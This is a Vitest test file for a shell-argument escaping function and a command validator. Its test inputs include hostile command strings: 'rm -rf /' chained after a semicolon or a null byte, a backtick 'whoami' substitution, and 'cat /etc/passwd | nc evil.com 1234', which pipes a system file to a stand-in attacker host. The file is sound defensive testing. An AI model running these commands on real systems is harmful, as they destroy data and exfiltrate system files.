import { describe, expect, it } from "vitest";
import { shellEscapeArg, validateCommand } from "../src/shell-escape.js";

describe("shellEscapeArg", () => {
  it("wraps simple string in single quotes", () => {
    expect(shellEscapeArg("hello")).toBe("'hello'");
  });

  it("escapes embedded single quotes", () => {
    expect(shellEscapeArg("it's")).toBe("'it'\\''s'");
  });

  it("handles empty string", () => {
    expect(shellEscapeArg("")).toBe("''");
  });

  it("handles string with spaces", () => {
    expect(shellEscapeArg("hello world")).toBe("'hello world'");
  });

  it("handles string with semicolons", () => {
    expect(shellEscapeArg("cmd; rm -rf /")).toBe("'cmd; rm -rf /'");
  });

  it("handles string with backticks", () => {
    expect(shellEscapeArg("`whoami`")).toBe("'`whoami`'");
  });

  it("handles string with dollar signs", () => {
    expect(shellEscapeArg("$HOME")).toBe("'$HOME'");
  });

  it("handles string with pipes", () => {
    expect(shellEscapeArg("cat /etc/passwd | nc evil.com 1234")).toBe("'cat /etc/passwd | nc evil.com 1234'");
  });

  it("handles multiple single quotes", () => {
    expect(shellEscapeArg("it's a 'test'")).toBe("'it'\\''s a '\\''test'\\'''");
  });
});

describe("validateCommand", () => {
  it("returns trimmed command for valid input", () => {
    expect(validateCommand("ls -la")).toBe("ls -la");
  });

  it("trims whitespace", () => {
    expect(validateCommand("  echo hello  ")).toBe("echo hello");
  });

  it("allows pipes (normal shell usage)", () => {
    expect(validateCommand("ls | grep foo")).toBe("ls | grep foo");
  });

  it("allows semicolons (normal shell usage)", () => {
    expect(validateCommand("cd /tmp; ls")).toBe("cd /tmp; ls");
  });

  it("allows && chaining", () => {
    expect(validateCommand("make && make install")).toBe("make && make install");
  });

  it("rejects null bytes", () => {
    expect(() => validateCommand("ls\0; rm -rf /")).toThrow("null bytes");
  });

  it("rejects empty command", () => {
    expect(() => validateCommand("")).toThrow("empty");
  });

  it("rejects whitespace-only command", () => {
    expect(() => validateCommand("   ")).toThrow("empty");
  });
});
